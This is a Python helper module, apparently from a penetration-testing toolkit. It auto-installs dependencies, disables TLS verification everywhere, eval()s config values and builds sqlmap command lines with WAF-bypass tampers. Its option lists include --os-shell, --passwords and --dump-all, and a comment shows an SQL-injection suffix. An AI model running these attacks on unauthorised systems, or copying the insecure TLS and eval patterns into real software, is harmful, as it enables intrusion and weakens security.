

import platform
import os
import re


def get_string_from_command(command):
    # 不能执行which nihao,这样不会有输出,可nihao得到输出
    # 执行成功的命令有正常输出,执行不成功的命令得不到输出,得到输出为"",eg.command=which nihao
    # 判断程序有没有已经安装可eg.get_string_from_command("sqlmap --help")
    import subprocess
    return subprocess.getstatusoutput(command)[1]



# SystemPlatform为操作系统种类,x86orx64为系统位数
#"Linux,Darwin,Windows"
SystemPlatform = platform.system()
x86orx64 = 0
if SystemPlatform in ["Linux", "Darwin"]:
    a = get_string_from_command("uname -a")
    if re.search(r"x86_64", a):
        x86orx64 = 64
    else:
        x86orx64 = 32
elif SystemPlatform == "Windows":
    if os.path.exists("c:\\Program Files(x86)"):
        x86orx64 = 64
    else:
        x86orx64 = 32


def module_exist(moduleName):
    # 检测python模块是否已经安装
    # 有则返回True
    # 无则返回False
    import re
    import os
    import sys
    out = get_string_from_command('''python3 -c "help('%s');"''' % moduleName)
    a = get_string_from_command("python3 --help")
    if SystemPlatform in ["Linux", "Darwin"]:
        if re.search(r"not found", a, re.I):
            print("Attention! I can not find `python3` in path,may be you didn't install it or didn't add it to PATH")
            sys.exit(1)
    else:
        # 由于windows下的python3默#认文件名为python.exe,如果直接改成python3.exe会导致pip3安装模块找不到pip3认为的
        # python.exe,于是在windows中使用本模块要求在python.exe同目录下将python.exe复制成python3.exe,两者保留
        if re.search(r"不是内部或外部命令", a, re.I):
            print("Attention! I can not find `python3` in path,may be you didn't install it or didn't add it to PATH")
            print("请确保在python.exe目录下将python.exe复制成python3.exe,并保留两者")
            sys.exit(1)
    if re.search(r"No Python documentation found for '%s'" % moduleName, out, re.I):
        return False
    else:
        return True


if not module_exist("pymysql"):
    os.system("pip3 install pymysql")

if not module_exist("chardet"):
    # 编码识别模块,eg.print(chardet.detect(bytesObject))
    os.system("pip3 install chardet")
if not module_exist("requests"):
    os.system("pip3 install requests")
if not module_exist("bs4"):
    os.system("pip3 install bs4")

if not module_exist("blessings"):
    os.system("pip3 install blessings")

if not module_exist("mechanicalsoup"):
    os.system("pip3 install MechanicalSoup")

if not module_exist("lxml"):
    if re.search(r"debian", get_string_from_command("uname -a"), re.I):
        os.system("apt-get install -y libxml2-dev libxslt1-dev zlib1g-dev")
    os.system("pip3 install lxml")


if not module_exist("progressive"):
    os.system("pip3 install progressive")

if not module_exist("selenium"):
    os.system("pip3 install selenium")

if not module_exist("colorama"):
    os.system("pip3 install colorama")

if not module_exist("wget"):
    os.system("pip3 install wget")

if not module_exist("scrapy"):
    os.system("pip3 install scrapy")

if not module_exist("scrapy_splash"):
    os.system("pip3 install scrapy_splash")


import sys
import random
import time
import urllib.request
import urllib.parse
import urllib.error
import glob
import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import threading
import queue
from multiprocessing.dummy import Pool as ThreadPool
from concurrent import futures
from time import sleep
import selenium
import requests
import readline
from scrapy_splash import SplashRequest


from colorama import *
if not "Windows" == SystemPlatform:
    from blessings import Terminal
    from progressive.bar import Bar
    from progressive.tree import ProgressTree, Value, BarDescriptor


import pymysql
pymysql.install_as_MySQLdb()


if sys.version_info >= (2, 7, 9):
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context

if sys.version_info <= (3, 0, 0):
    print("sorry,this module works on python3")
    sys.exit(0)

from requests.packages.urllib3.exceptions import InsecureRequestWarning,InsecurePlatformWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)


def get_module_path():
    # 得到当前文件的路径
    tmpPath = os.path.abspath(__file__)
    modulePath = tmpPath[:-len(__file__.split("/")[-1])]
    return modulePath

def get_home_path():
    # python在os.path.exists("~")时不认识~目录,于是写出这个函数
    # open("~/.zshrc")函数也不认识~
    # 但是os.system认识~,可能只有os.system认识
    # 也即操作系统认识~,但是python不认识~
    # macOS下的~是/var/root,ubuntu下的~是/root
    # 返回~目录的具体值,eg./var/root
    #a=get_string_from_command("cd ~ && pwd")
    # 后来发现os.path.expanduser函数可以认识~
    return os.path.expanduser("~")

HOME_PATH = get_home_path()



# 下面将ModulePath引出,以后发布exp10it自动化工具时就不用将cms_identify和dicts文件夹放到github上了,已经打包到
# pypi的exp10it模块中,安装时[cms_identify和dicts文件夹]会安装到如/usr/local/lib/python3.5/dist-packages/目录下
ModulePath = get_module_path()
WORK_PATH = os.getcwd()
CONFIG_PATH = HOME_PATH+"/.3xp10it"
CONFIG_INI_PATH = HOME_PATH+"/.3xp10it"+ "/config.ini"
LOG_FOLDER_PATH = HOME_PATH+"/.3xp10it"+ "/log"

DB_SERVER=""
DB_USER=""
DB_PASS=""
DB_NAME="exp10itdb"
TARGETS_TABLE_NAME="targets"
FIRST_TARGETS_TABLE_NAME="first_targets"
DELAY=""
SCAN_WAY=""
#IPProxyPoolUrl=""
#SPLASH_URL=""


RESOURCE_FILE_PATTERN = re.compile(r"^http.*(\.(jpg)|(chm)|(jar)|(jpeg)|(gif)|(ico)|(bak)|(png)|\
(bmp)|(txt)|(doc)|(docx)|(pdf)|(txt)|(xls)|(xlsx)|(rar)|(zip)|(avi)|(mp4)|(rmvb)|(flv)|\
(m3u)|(msi)|(exe)|(com)|(pif)|(mp3)|(wav)|(mkv)|(7z)|(gz)|(htaccess)|(ini)|(xml)|(key)|\
(dll)|(css)|(cab)|(bin)|(svg)|(js))$", re.I)

def get_key_value_from_config_file(file, section, key_name):
    import re
    with open(file, "r+") as f:
        content = f.read()
    if not re.search(r"%", content, re.I) and not re.search(r"(:.*=)|(=.*:)", content, re.I):
        import configparser
        config = configparser.ConfigParser()
        config.read(file)
        value = config.get(section, key_name)
        return value
    else:
        # configparser的bug,无法读写'%'
        find = re.search(r"\[%s\]\n+(.+\n+)*%s[^\n\S]*\=[^\n\S]*(.*)" %
                         (section.replace(".", "\."), key_name), content)
        if find:
            return find.group(2)
        else:
            print("can not find %s's value in section:%s" %
                  (key_name, section))
            return None

if os.path.exists(CONFIG_INI_PATH):
    DB_SERVER=eval(get_key_value_from_config_file(
        CONFIG_INI_PATH, 'default', 'db_server'))
    DB_USER= eval(get_key_value_from_config_file(
        CONFIG_INI_PATH, 'default', 'db_user'))
    DB_PASS= eval(get_key_value_from_config_file(
        CONFIG_INI_PATH, 'default', 'db_pass'))
    DELAY= eval(get_key_value_from_config_file(
        CONFIG_INI_PATH, 'default', 'delay'))
    SCAN_WAY= eval(get_key_value_from_config_file(
        CONFIG_INI_PATH, 'default', 'scan_way'))


# 常见非web服务端口
COMMON_NOT_WEB_PORT_LIST= ['21', '22', '53', '137',
                        '139', '145', '445', '1433', '3306', '3389']

domain_suf_list = ['.aaa', '.aarp', '.abarth', '.abb', '.abbott', '.abbvie', '.abc', '.able', '.abogado',
                   '.abudhabi', '.ac', '.academy', '.accenture', '.accountant', '.accountants', '.aco', '.active', '.actor',
                   '.ad', '.adac', '.ads', '.adult', '.ae', '.aeg', '.aero', '.aetna', '.af', '.afamilycompany', '.afl',
                   '.africa', '.ag', '.agakhan', '.agency', '.ai', '.aig', '.aigo', '.airbus', '.airforce', '.airtel',
                   '.akdn', '.al', '.alfaromeo', '.alibaba', '.alipay', '.allfinanz', '.allstate', '.ally', '.alsace',
                   '.alstom', '.am', '.americanexpress', '.americanfamily', '.amex', '.amfam', '.amica', '.amsterdam',
                   '.an', '.analytics', '.android', '.anquan', '.anz', '.ao', '.aol', '.apartments', '.app', '.apple',
                   '.aq', '.aquarelle', '.ar', '.aramco', '.archi', '.army', '.arpa', '.art', '.arte', '.as', '.asda',
                   '.asia', '.associates', '.at', '.athleta', '.attorney', '.au', '.auction', '.audi', '.audible', '.audio',
                   '.auspost', '.author', '.auto', '.autos', '.avianca', '.aw', '.aws', '.ax', '.axa', '.az', '.azure',
                   '.ba', '.baby', '.baidu', '.banamex', '.bananarepublic', '.band', '.bank', '.bar', '.barcelona',
                   '.barclaycard', '.barclays', '.barefoot', '.bargains', '.baseball', '.basketball', '.bauhaus', '.bayern',
                   '.bb', '.bbc', '.bbt', '.bbva', '.bcg', '.bcn', '.bd', '.be', '.beats', '.beauty', '.beer', '.bentley',
                   '.berlin', '.best', '.bestbuy', '.bet', '.bf', '.bg', '.bh', '.bharti', '.bi', '.bible', '.bid', '.bike',
                   '.bing', '.bingo', '.bio', '.biz', '.bj', '.bl', '.black', '.blackfriday', '.blanco', '.blockbuster',
                   '.blog', '.bloomberg', '.blue', '.bm', '.bms', '.bmw', '.bn', '.bnl', '.bnpparibas', '.bo', '.boats',
                   '.boehringer', '.bofa', '.bom', '.bond', '.boo', '.book', '.booking', '.boots', '.bosch', '.bostik',
                   '.boston', '.bot', '.boutique', '.box', '.bq', '.br', '.bradesco', '.bridgestone', '.broadway',
                   '.broker', '.brother', '.brussels', '.bs', '.bt', '.budapest', '.bugatti', '.build', '.builders',
                   '.business', '.buy', '.buzz', '.bv', '.bw', '.by', '.bz', '.bzh', '.ca', '.cab', '.cafe', '.cal',
                   '.call', '.calvinklein', '.cam', '.camera', '.camp', '.cancerresearch', '.canon', '.capetown',
                   '.capital', '.capitalone', '.car', '.caravan', '.cards', '.care', '.career', '.careers', '.cars',
                   '.cartier', '.casa', '.case', '.caseih', '.cash', '.casino', '.cat', '.catering', '.catholic', '.cba',
                   '.cbn', '.cbre', '.cbs', '.cc', '.cd', '.ceb', '.center', '.ceo', '.cern', '.cf', '.cfa', '.cfd', '.cg',
                   '.ch', '.chanel', '.channel', '.chase', '.chat', '.cheap', '.chintai', '.chloe', '.christmas', '.chrome',
                   '.chrysler', '.church', '.ci', '.cipriani', '.circle', '.cisco', '.citadel', '.citi', '.citic', '.city',
                   '.cityeats', '.ck', '.cl', '.claims', '.cleaning', '.click', '.clinic', '.clinique', '.clothing',
                   '.cloud', '.club', '.clubmed', '.cm', '.cn', '.co', '.coach', '.codes', '.coffee', '.college',
                   '.cologne', '.com', '.comcast', '.commbank', '.community', '.company', '.compare', '.computer',
                   '.comsec', '.condos', '.construction', '.consulting', '.contact', '.contractors', '.cooking',
                   '.cookingchannel', '.cool', '.coop', '.corsica', '.country', '.coupon', '.coupons', '.courses', '.cr',
                   '.credit', '.creditcard', '.creditunion', '.cricket', '.crown', '.crs', '.cruise', '.cruises', '.csc',
                   '.cu', '.cuisinella', '.cv', '.cw', '.cx', '.cy', '.cymru', '.cyou', '.cz', '.dabur', '.dad', '.dance',
                   '.data', '.date', '.dating', '.datsun', '.day', '.dclk', '.dds', '.de', '.deal', '.dealer', '.deals',
                   '.degree', '.delivery', '.dell', '.deloitte', '.delta', '.democrat', '.dental', '.dentist', '.desi',
                   '.design', '.dev', '.dhl', '.diamonds', '.diet', '.digital', '.direct', '.directory', '.discount',
                   '.discover', '.dish', '.diy', '.dj', '.dk', '.dm', '.dnp', '.do', '.docs', '.doctor', '.dodge', '.dog',
                   '.doha', '.domains', '.doosan', '.dot', '.download', '.drive', '.dtv', '.dubai', '.duck', '.dunlop',
                   '.duns', '.dupont', '.durban', '.dvag', '.dvr', '.dz', '.earth', '.eat', '.ec', '.eco', '.edeka', '.edu',
                   '.education', '.ee', '.eg', '.eh', '.email', '.emerck', '.energy', '.engineer', '.engineering',
                   '.enterprises', '.epost', '.epson', '.equipment', '.er', '.ericsson', '.erni', '.es', '.esq', '.estate',
                   '.esurance', '.et', '.eu', '.eurovision', '.eus', '.events', '.everbank', '.exchange', '.expert',
                   '.exposed', '.express', '.extraspace', '.fage', '.fail', '.fairwinds', '.faith', '.family', '.fan',
                   '.fans', '.farm', '.farmers', '.fashion', '.fast', '.fedex', '.feedback', '.ferrari', '.ferrero', '.fi',
                   '.fiat', '.fidelity', '.fido', '.film', '.final', '.finance', '.financial', '.fire', '.firestone',
                   '.firmdale', '.fish', '.fishing', '.fit', '.fitness', '.fj', '.fk', '.flickr', '.flights', '.flir',
                   '.florist', '.flowers', '.flsmidth', '.fly', '.fm', '.fo', '.foo', '.food', '.foodnetwork', '.football',
                   '.ford', '.forex', '.forsale', '.forum', '.foundation', '.fox', '.fr', '.free', '.fresenius', '.frl',
                   '.frogans', '.frontdoor', '.frontier', '.ftr', '.fujitsu', '.fujixerox', '.fun', '.fund', '.furniture',
                   '.futbol', '.fyi', '.ga', '.gal', '.gallery', '.gallo', '.gallup', '.game', '.games', '.gap', '.garden',
                   '.gb', '.gbiz', '.gd', '.gdn', '.ge', '.gea', '.gent', '.genting', '.george', '.gf', '.gg', '.ggee',
                   '.gh', '.gi', '.gift', '.gifts', '.gives', '.giving', '.gl', '.glade', '.glass', '.gle', '.global', '.globo',
                   '.gm', '.gmail', '.gmbh', '.gmo', '.gmx', '.gn', '.godaddy', '.gold', '.goldpoint', '.golf', '.goo',
                   '.goodhands', '.goodyear', '.goog', '.google', '.gop', '.got', '.gov', '.gp', '.gq', '.gr', '.grainger',
                   '.graphics', '.gratis', '.green', '.gripe', '.group', '.gs', '.gt', '.gu', '.guardian', '.gucci', '.guge',
                   '.guide', '.guitars', '.guru', '.gw', '.gy', '.hair', '.hamburg', '.hangout', '.haus', '.hbo', '.hdfc',
                   '.hdfcbank', '.health', '.healthcare', '.help', '.helsinki', '.here', '.hermes', '.hgtv', '.hiphop',
                   '.hisamitsu', '.hitachi', '.hiv', '.hk', '.hkt', '.hm', '.hn', '.hockey', '.holdings', '.holiday', '.homedepot',
                   '.homegoods', '.homes', '.homesense', '.honda', '.honeywell', '.horse', '.hospital', '.host', '.hosting', '.hot',
                   '.hoteles', '.hotmail', '.house', '.how', '.hr', '.hsbc', '.ht', '.htc', '.hu', '.hughes', '.hyatt', '.hyundai',
                   '.ibm', '.icbc', '.ice', '.icu', '.id', '.ie', '.ieee', '.ifm', '.iinet', '.ikano', '.il', '.im', '.imamat',
                   '.imdb', '.immo', '.immobilien', '.in', '.industries', '.infiniti', '.info', '.ing', '.ink', '.institute',
                   '.insurance', '.insure', '.int', '.intel', '.international', '.intuit', '.investments', '.io', '.ipiranga',
                   '.iq', '.ir', '.irish', '.is', '.iselect', '.ismaili', '.ist', '.istanbul', '.it', '.itau', '.itv', '.iveco',
                   '.iwc', '.jaguar', '.java', '.jcb', '.jcp', '.je', '.jeep', '.jetzt', '.jewelry', '.jio', '.jlc', '.jll', '.jm',
                   '.jmp', '.jnj', '.jo', '.jobs', '.joburg', '.jot', '.joy', '.jp', '.jpmorgan', '.jprs', '.juegos', '.juniper',
                   '.kaufen', '.kddi', '.ke', '.kerryhotels', '.kerrylogistics', '.kerryproperties', '.kfh', '.kg', '.kh', '.ki',
                   '.kia', '.kim', '.kinder', '.kindle', '.kitchen', '.kiwi', '.km', '.kn', '.koeln', '.komatsu', '.kosher', '.kp',
                   '.kpmg', '.kpn', '.kr', '.krd', '.kred', '.kuokgroup', '.kw', '.ky', '.kyoto', '.kz', '.la', '.lacaixa',
                   '.ladbrokes', '.lamborghini', '.lamer', '.lancaster', '.lancia', '.lancome', '.land', '.landrover', '.lanxess',
                   '.lasalle', '.lat', '.latino', '.latrobe', '.law', '.lawyer', '.lb', '.lc', '.lds', '.lease', '.leclerc',
                   '.lefrak', '.legal', '.lego', '.lexus', '.lgbt', '.li', '.liaison', '.lidl', '.life', '.lifeinsurance',
                   '.lifestyle', '.lighting', '.like', '.lilly', '.limited', '.limo', '.lincoln', '.linde', '.link', '.lipsy',
                   '.live', '.living', '.lixil', '.lk', '.loan', '.loans', '.locker', '.locus', '.loft', '.lol', '.london',
                   '.lotte', '.lotto', '.love', '.lpl', '.lplfinancial', '.lr', '.ls', '.lt', '.ltd', '.ltda', '.lu', '.lundbeck',
                   '.lupin', '.luxe', '.luxury', '.lv', '.ly', '.ma', '.macys', '.madrid', '.maif', '.maison', '.makeup', '.man',
                   '.management', '.mango', '.market', '.marketing', '.markets', '.marriott', '.marshalls', '.maserati', '.mattel',
                   '.mba', '.mc', '.mcd', '.mcdonalds', '.mckinsey', '.md', '.me', '.med', '.media', '.meet', '.melbourne', '.meme',
                   '.memorial', '.men', '.menu', '.meo', '.metlife', '.mf', '.mg', '.mh', '.miami', '.microsoft', '.mil', '.mini',
                   '.mint', '.mit', '.mitsubishi', '.mk', '.ml', '.mlb', '.mls', '.mm', '.mma', '.mn', '.mo', '.mobi', '.mobile',
                   '.mobily', '.moda', '.moe', '.moi', '.mom', '.monash', '.money', '.monster', '.montblanc', '.mopar', '.mormon',
                   '.mortgage', '.moscow', '.moto', '.motorcycles', '.mov', '.movie', '.movistar', '.mp', '.mq', '.mr', '.ms',
                   '.msd', '.mt', '.mtn', '.mtpc', '.mtr', '.mu', '.museum', '.mutual', '.mutuelle', '.mv', '.mw', '.mx', '.my',
                   '.mz', '.na', '.nab', '.nadex', '.nagoya', '.name', '.nationwide', '.natura', '.navy', '.nba', '.nc', '.ne',
                   '.nec', '.net', '.netbank', '.netflix', '.network', '.neustar', '.new', '.newholland', '.news', '.next',
                   '.nextdirect', '.nexus', '.nf', '.nfl', '.ng', '.ngo', '.nhk', '.ni', '.nico', '.nike', '.nikon', '.ninja',
                   '.nissan', '.nissay', '.nl', '.no', '.nokia', '.northwesternmutual', '.norton', '.now', '.nowruz', '.nowtv',
                   '.np', '.nr', '.nra', '.nrw', '.ntt', '.nu', '.nyc', '.nz', '.obi', '.observer', '.off', '.office', '.okinawa',
                   '.olayan', '.olayangroup', '.oldnavy', '.ollo', '.om', '.omega', '.one', '.ong', '.onl', '.online',
                   '.onyourside', '.ooo', '.open', '.oracle', '.orange', '.org', '.organic', '.orientexpress', '.origins', '.osaka',
                   '.otsuka', '.ott', '.ovh', '.pa', '.page', '.pamperedchef', '.panasonic', '.panerai', '.paris', '.pars',
                   '.partners', '.parts', '.party', '.passagens', '.pay', '.pccw', '.pe', '.pet', '.pf', '.pfizer', '.pg', '.ph',
                   '.pharmacy', '.philips', '.phone', '.photo', '.photography', '.photos', '.physio', '.piaget', '.pics', '.pictet',
                   '.pictures', '.pid', '.pin', '.ping', '.pink', '.pioneer', '.pizza', '.pk', '.pl', '.place', '.play',
                   '.playstation', '.plumbing', '.plus', '.pm', '.pn', '.pnc', '.pohl', '.poker', '.politie', '.porn', '.post',
                   '.pr', '.pramerica', '.praxi', '.press', '.prime', '.pro', '.prod', '.productions', '.prof', '.progressive',
                   '.promo', '.properties', '.property', '.protection', '.pru', '.prudential', '.ps', '.pt', '.pub', '.pw', '.pwc',
                   '.py', '.qa', '.qpon', '.quebec', '.quest', '.qvc', '.racing', '.radio', '.raid', '.re', '.read', '.realestate',
                   '.realtor', '.realty', '.recipes', '.red', '.redstone', '.redumbrella', '.rehab', '.reise', '.reisen', '.reit',
                   '.reliance', '.ren', '.rent', '.rentals', '.repair', '.report', '.republican', '.rest', '.restaurant', '.review',
                   '.reviews', '.rexroth', '.rich', '.richardli', '.ricoh', '.rightathome', '.ril', '.rio', '.rip', '.rmit', '.ro',
                   '.rocher', '.rocks', '.rodeo', '.rogers', '.room', '.rs', '.rsvp', '.ru', '.ruhr', '.run', '.rw', '.rwe',
                   '.ryukyu', '.sa', '.saarland', '.safe', '.safety', '.sakura', '.sale', '.salon', '.samsclub', '.samsung',
                   '.sandvik', '.sandvikcoromant', '.sanofi', '.sap', '.sapo', '.sarl', '.sas', '.save', '.saxo', '.sb', '.sbi',
                   '.sbs', '.sc', '.sca', '.scb', '.schaeffler', '.schmidt', '.scholarships', '.school', '.schule', '.schwarz',
                   '.science', '.scjohnson', '.scor', '.scot', '.sd', '.se', '.seat', '.secure', '.security', '.seek', '.select',
                   '.sener', '.services', '.ses', '.seven', '.sew', '.sex', '.sexy', '.sfr', '.sg', '.sh', '.shangrila', '.sharp',
                   '.shaw', '.shell', '.shia', '.shiksha', '.shoes', '.shop', '.shopping', '.shouji', '.show', '.showtime',
                   '.shriram', '.si', '.silk', '.sina', '.singles', '.site', '.sj', '.sk', '.ski', '.skin', '.sky', '.skype', '.sl',
                   '.sling', '.sm', '.smart', '.smile', '.sn', '.sncf', '.so', '.soccer', '.social', '.softbank', '.software',
                   '.sohu', '.solar', '.solutions', '.song', '.sony', '.soy', '.space', '.spiegel', '.spot', '.spreadbetting',
                   '.sr', '.srl', '.srt', '.ss', '.st', '.stada', '.staples', '.star', '.starhub', '.statebank', '.statefarm',
                   '.statoil', '.stc', '.stcgroup', '.stockholm', '.storage', '.store', '.stream', '.studio', '.study', '.style',
                   '.su', '.sucks', '.supplies', '.supply', '.support', '.surf', '.surgery', '.suzuki', '.sv', '.swatch',
                   '.swiftcover', '.swiss', '.sx', '.sy', '.sydney', '.symantec', '.systems', '.sz', '.tab', '.taipei', '.talk',
                   '.taobao', '.target', '.tatamotors', '.tatar', '.tattoo', '.tax', '.taxi', '.tc', '.tci', '.td', '.tdk', '.team',
                   '.tech', '.technology', '.tel', '.telecity', '.telefonica', '.temasek', '.tennis', '.teva', '.tf', '.tg', '.th',
                   '.thd', '.theater', '.theatre', '.tiaa', '.tickets', '.tienda', '.tiffany', '.tips', '.tires', '.tirol', '.tj',
                   '.tjmaxx', '.tjx', '.tk', '.tkmaxx', '.tl', '.tm', '.tmall', '.tn', '.to', '.today', '.tokyo', '.tools', '.top',
                   '.toray', '.toshiba', '.total', '.tours', '.town', '.toyota', '.toys', '.tp', '.tr', '.trade', '.trading',
                   '.training', '.travel', '.travelchannel', '.travelers', '.travelersinsurance', '.trust', '.trv', '.tt', '.tube',
                   '.tui', '.tunes', '.tushu', '.tv', '.tvs', '.tw', '.tz', '.ua', '.ubank', '.ubs', '.uconnect', '.ug', '.uk',
                   '.um', '.unicom', '.university', '.uno', '.uol', '.ups', '.us', '.uy', '.uz', '.va', '.vacations', '.vana',
                   '.vanguard', '.vc', '.ve', '.vegas', '.ventures', '.verisign', '.versicherung', '.vet', '.vg', '.vi', '.viajes',
                   '.video', '.vig', '.viking', '.villas', '.vin', '.vip', '.virgin', '.visa', '.vision', '.vista', '.vistaprint',
                   '.viva', '.vivo', '.vlaanderen', '.vn', '.vodka', '.volkswagen', '.volvo', '.vote', '.voting', '.voto',
                   '.voyage', '.vu', '.vuelos', '.wales', '.walmart', '.walter', '.wang', '.wanggou', '.warman', '.watch',
                   '.watches', '.weather', '.weatherchannel', '.webcam', '.weber', '.website', '.wed', '.wedding', '.weibo',
                   '.weir', '.wf', '.whoswho', '.wien', '.wiki', '.williamhill', '.win', '.windows', '.wine', '.winners', '.wme',
                   '.wolterskluwer', '.woodside', '.work', '.works', '.world', '.wow', '.ws', '.wtc', '.wtf', '.xbox', '.xerox',
                   '.xfinity', '.xihuan', '.xin', '.xperia', '.xxx', '.xyz', '.yachts', '.yahoo', '.yamaxun', '.yandex', '.ye', '.yodobashi', '.yoga', '.yokohama', '.you', '.youtube', '.yt', '.yun', '.za', '.zappos', '.zara', '.zero', '.zip', '.zippo', '.zm', '.zone', '.zuerich', '.zw']



def combileMyParaAndArgvPara(command):
    import sys
    import re
    '''
    try:
        options,args=getopt.getopt(sys.argv[1:],"u:v:",["batch","random-agent","smart","user-agent=","referer","level=","tamper=","proxy=","threads=","dbms=",])
    '''

    singleArgvList = ["--drop-set-cookie", "--random-agent", "--ignore-proxy", "--ignore-redirects", "--ignore-timeouts", "--skip-urlencode", "-b", "--banner", "--current-user", "--current-db", "--is-dba", "--users", "--passwords", "--privileges", "--roles", "--dbs", "--tables", "--exclude-sysdbs", "--columns", "--schema", "--count", "--dump", "--dump-all", "--sql-shell", "--common-tables", "--common-columns", "--os-shell", "--os-pwn", "--os-smbrelay", "--os-bof", "--batch", "--eta", "--flush-session", "--forms", "--fresh-queries", "--hex",
                      "--no-cast", "--parse-errors", "--alert", "--beep", "--check-waf", "--cleanup", "--disable-coloring", "-hpp", "--identify-waf", "--purge-output", "--smart", "--wizard", "-h", "--help", "-hh", "--version", "--ignore-401", "--tor", "--check-tor", "--force-ssl", "-o", "--predict-output", "--keep-alive", "--null-connection", "--skip-static", "--no-escape", "-f", "--fingerprint", "-a", "--all", "--hostname", "--comments", "--priv-esc", "--reg-read", "--reg-add", "--reg-del", "--update", "--dependencies", "--offline", "--skip-waf", "--sqlmap-shell"]
    doubleArgvList = ["-v", "-u", "--url", "--threads", "-l", "-m", "-r", "-g", "--data", "--param-del", "--cookie", "--cookie-del", "--load-cookies", "--level", "--user-agent", "--referer", "--headers", "--host", "-H", "--auth-type", "--auth-cred", "--auth-cert", "--auth-file", "--proxy", "--proxy-cred", "--proxy-file", "--delay", "--timeout", "--retries", "--randomize", "--scope", "--safe-url", "--safe-post", "--safe-req", "--safe-freq", "--eval", "-p", "--skip", "--dbms", "--os", "--invalid-bignum", "--invalid-logical", "--invalid-string", "--prefix", "--suffix", "--tamper", "--risk", "--string", "--not-string", "--regexp", "--code", "--text-only", "--titles", "--technique", "--time-sec", "--union-cols", "--union-char",
                      "--union-from", "--second-order", "-D", "-X", "-T", "-C", "--start", "--stop", "--first", "--last", "--search", "--sql-query", "--sql-file", "--udf-inject", "--shared-lib", "--file-read", "--file-write", "--file-dest", "--os-cmd", "--reg-key", "--reg-value", "--reg-data", "--reg-type", "-s", "-t", "--charset", "--crawl", "--crawl-exclude", "--csv-del", "--dbms-cred", "--dump-format", "--output-dir", "-z", "--answers", "--gpage", "--mobile", "-d", "-x", "-c", "--method", "--tor-port", "--tor-type", "--csrf-token", "--csrf-url", "--param-exclude", "--dns-domain", "-U", "--pivot-column", "--where", "--msf-path", "--tmp-path", "-s", "-t", "--binary-fields", "--save", "--test-filter", "--test-skip", "--tmp-dir", "--web-root"]
    commandList = string2argv(command)
    print(commandList)

    argvList = param2argv(sys.argv[1:])
    #print(argvList)

    finalCommand = ""
    argvIndex = 0
    noneedParam = ""
    for each in argvList:
        if each in commandList:
            if each in singleArgvList:
                finalCommand += (" " +
                                 each if " " not in each else '"' + each + '"')
                pass
            elif each in doubleArgvList:
                finalCommand += (" " +
                                 each if " " not in each else '"' + each + '"')
                tmp = argvList[argvIndex + 1]
                finalCommand += (" " +
                                 (tmp if " " not in tmp else '"' + tmp + '"'))
                noneedParam = argvList[argvIndex + 1]
                pass
            else:
                pass
        else:
            if each in singleArgvList:
                finalCommand += (" " +
                                 each if " " not in each else '"' + each + '"')
                pass
            elif each in doubleArgvList:
                if each=="--suffix":
                    print(finalCommand)

                finalCommand += (" " +
                                 each if " " not in each else '"' + each + '"')
                tmp = argvList[argvIndex + 1]
                #patch or --suffix " or '1'='1"
                if " " in tmp:
                    tmp=tmp.replace(" ","xxxxx")
                finalCommand += (" " +
                                 (tmp if "xxxxx" not in tmp else tmp))
                noneedParam = argvList[argvIndex + 1]
                pass
                
            elif each != noneedParam:
                finalCommand += (" " +
                                 each if " " not in each else '"' + each + '"')
                pass
        argvIndex += 1

    commandIndex = 0
    noneedParam = ""
    for each in commandList:
        if each in argvList and each != noneedParam:
            if each in singleArgvList:

                pass
            elif each in doubleArgvList:
                noneedParam = commandList[commandIndex + 1]

                pass
            else:
                pass
        else:
            if each in singleArgvList:
                finalCommand += (" " +
                                 each if " " not in each else '"' + each + '"')
                pass
            elif each in doubleArgvList:
                finalCommand += (" " +
                                 each if " " not in each else '"' + each + '"')
                tmp = commandList[commandIndex + 1]
                finalCommand += (" " +
                                 (tmp if " " not in tmp else '"' + tmp + '"'))
                pass
            else:
                # 这种情况不可能,除非我在代码中用到的sqlmap参数是不正确的
                pass
        commandIndex += 1
    #print(commandList)

    if "--tamper" in argvList:
        argvListTamperList = []
        commandListTamperList = []
        argvIndex = 0
        commandIndex = 0
        for each in argvList:
            if each == "--tamper":
                argvListTamperString = argvList[argvIndex + 1]
            argvIndex += 1
        if "," not in argvListTamperString:
            # argv的tamper参数的值有1个tamper
            argvListTamperList.append(argvListTamperString)
        else:
            # argv的tamper参数的值有多个tamper
            argvListTamperList = argvListTamperString.split(",")
        # 到这里得到argv传入tamper参数中的tamper列表

        # 2017/08/30新增
        commandListTamperString = ""
        for each in commandList:
            if each == "--tamper":
                commandListTamperString = commandList[commandIndex + 1]
            commandIndex += 1
        if "," not in commandListTamperString:
            commandListTamperList.append(commandListTamperString)
        else:
            commandListTamperList = commandListTamperString.split(",")
        # 到这里得到我的xwaf.py内置的tamper方案中的tamper列表

        finalTamper = ""
        for eachTamper in argvListTamperList:
            finalTamper += (eachTamper + ",")
        for eachTamper in commandListTamperList:
            if eachTamper not in argvListTamperList:
                finalTamper += (eachTamper + ",")
        if finalTamper[-1] == ",":
            finalTamper = finalTamper[:-1]
        finalCommand = re.sub(r"--tamper[\s]+[^\s]+", "", finalCommand)
        finalCommand += (" --tamper" + " " + finalTamper)
    else:
        pass

    # 1

    finalCommandList = finalCommand[1:].split(" ")

    tmpList = []
    for each in finalCommandList:
        if each!="" and each[0] != "-":
            tmpList.append(' "' + each + '"')
        else:
            tmpList.append(' ' + each)
    finalCommand = "".join(tmpList)
    # 1

    finalCommand = "python2 /usr/share/sqlmap/sqlmap.py" + finalCommand
    if "xxxxx" in finalCommand:
        finalCommand=finalCommand.replace("xxxxx"," ")
    return finalCommand


def base64Str(string):
    # 得到base64的字符串
    # 输入为str类型
    # 返回为str类型
    import base64
    bytesString = (string).encode(encoding="utf-8")
    bytesbase64Str = base64.b64encode(bytesString)
    base64Str = bytesbase64Str.decode()
    return base64Str


class CLIOutput(object):
    # 一般用法:正常运行要输出的内容用该类的good_print函数,显示运行状态用new_thread_bottom_print函数,其中
    # 如果要终结new_thread_bottom_print线程,将sefl.stop_order置1即可

    import shlex
    import struct
    import subprocess

    def get_terminal_size(self):
        """ getTerminalSize()
         - get width and height of console
         - works on linux,os x,windows,cygwin(windows)
         originally retrieved from:
         http://stackoverflow.com/questions/566746/how-to-get-console-window-width-in-python
        """
        current_os = platform.system()
        tuple_xy = None
        if current_os == 'Windows':
            tuple_xy = self._get_terminal_size_windows()
            if tuple_xy is None:
                tuple_xy = self._get_terminal_size_tput()
                # needed for window's python in cygwin's xterm!
